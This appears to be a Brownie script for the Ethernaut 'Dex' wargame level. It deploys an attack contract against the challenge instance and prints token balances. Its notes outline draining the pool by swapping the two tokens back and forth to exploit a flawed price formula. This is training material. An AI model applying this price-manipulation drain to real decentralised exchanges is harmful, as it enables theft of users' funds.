from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert, Attack22
from eth_utils import keccak


ETHERNAUT_INSTANCE = "0x54B33296970E87bde1504FB91E441008aB69347c"
TOKEN1 = "0x0cDbf0cb813020505f2C2C57187a3CB1249C34ad"
TOKEN2 = "0x3dE9BcAA4027ca200c22b159f70b683714Cd45F0"
AMOUNT = 10

GAS_LIMIT = 6000000


def balances():
    target = interface.IDex(ETHERNAUT_INSTANCE)
    balance1 = target.balanceOf(TOKEN1, ETHERNAUT_INSTANCE)
    balance2 = target.balanceOf(TOKEN2, ETHERNAUT_INSTANCE)
    print(f"\nbalance 1 = {balance1}, balance 2 = {balance2}\n")


def main():

    player = get_account()
    attack = Attack22.deploy(ETHERNAUT_INSTANCE, {"from": player})
    balances()
    # attack.attack({"from": player})
    # balances()


"""
        Audit notes:

        1. Dex contract
            - storage slot 0, 1, 2 -> contain addresses
        2. SwappableToken contract
            - we can ignore this as the approve method is included
              in the Dex contract (for ease)
        3. Function swap() is where the token transfer happens
       
        4. Swap price calculation
        
            - (amount * 'to' price) / ('from' price)
                so: swap price == amount * (token ratio)
    
        5. Swap process ->

            - see 22-simulate_dex.py (this models the swap process)
                       
    ===================================================================

        Script steps:
        
        1) set player account
        2) define target interface (Dex contract)
        3) define token1 and token2
        4) approve token1 and token2
        5) assign tokenTo and tokenFrom (so you can toggle them)
        7) get swap_price

        8) while swap_price < tokenTo.balanceOf(target)
            8a. perform swap
            8b. toggle to/from
            8c. get swap_price

        9) manually perform the final swap to drain the funds

"""
